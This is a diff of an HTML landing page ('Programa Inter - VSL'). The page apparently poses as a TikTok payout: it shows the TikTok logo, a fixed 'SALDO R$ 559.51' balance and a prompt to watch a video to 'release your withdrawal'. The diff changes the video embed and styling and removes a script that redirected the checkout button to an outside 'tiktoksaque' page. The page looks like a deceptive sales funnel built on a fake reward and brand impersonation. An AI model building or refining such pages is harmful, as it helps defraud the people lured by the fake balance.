@@ -5,10 +5,8 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="css2.html">
     <title>Programa Inter - VSL</title>
     <link rel="icon" href="images/Logo%20TTK.png" type="image/x-icon">
-
     <style>
         * {
             margin: 0;
@@ -101,15 +99,11 @@
             border-radius: 8px;
             margin-bottom: 20px;
             position: relative;
-            padding-top: 56.25%; /* Aspect ratio 16:9 */
         }
 
         iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
-            height: 100%;
+            height: 315px;
             border: none;
         }
 
@@ -136,27 +130,7 @@
         button:hover {
             background-color: #e66a00;
         }
-
-        /* Responsividade */
-        @media (max-width: 480px) {
-            #p1 {
-                flex-direction: row;
-                justify-content: space-between;
-            }
-        }
     </style>
-
-    <script>
-        // Redefine o link do botão diretamente
-        document.addEventListener("DOMContentLoaded", function () {
-            const checkoutLink = document.querySelector(".centralizar a");
-
-            if (checkoutLink) {
-                // Define o link fixo para redirecionamento correto
-                checkoutLink.href = "https://novidadesdigital.pages.dev/tiktoksaque/";
-            }
-        });
-    </script>
 </head>
 
 <body>
@@ -165,7 +139,7 @@
     </div>
 
     <div id="p1">
-        <img id="logo" src="images/tiktoklogo.svg" alt="Spotify Logo">
+        <img id="logo" src="images/tiktoklogo.svg" alt="TikTok Logo">
         <div class="boxSaldo">
             <span class="textoSaldo">SALDO</span>
             <span class="valorSaldo">R$ <span class="saldoAtualizado">559.51</span></span>
@@ -177,8 +151,12 @@
         <p>Veja como liberar seu saque assistindo ao vídeo.</p>
 
         <div id="video-container">
-            <!-- Insira a URL do vídeo de VSL abaixo -->
-            <iframe src="https://www.youtube.com/shorts/IoTaw-pI27s" frameborder="0" allowfullscreen></iframe>
+            <iframe 
+                src="https://player.vimeo.com/video/1047987546" 
+                frameborder="0" 
+                allow="autoplay; fullscreen" 
+                allowfullscreen>
+            </iframe>
         </div>
 
         <div class="centralizar">
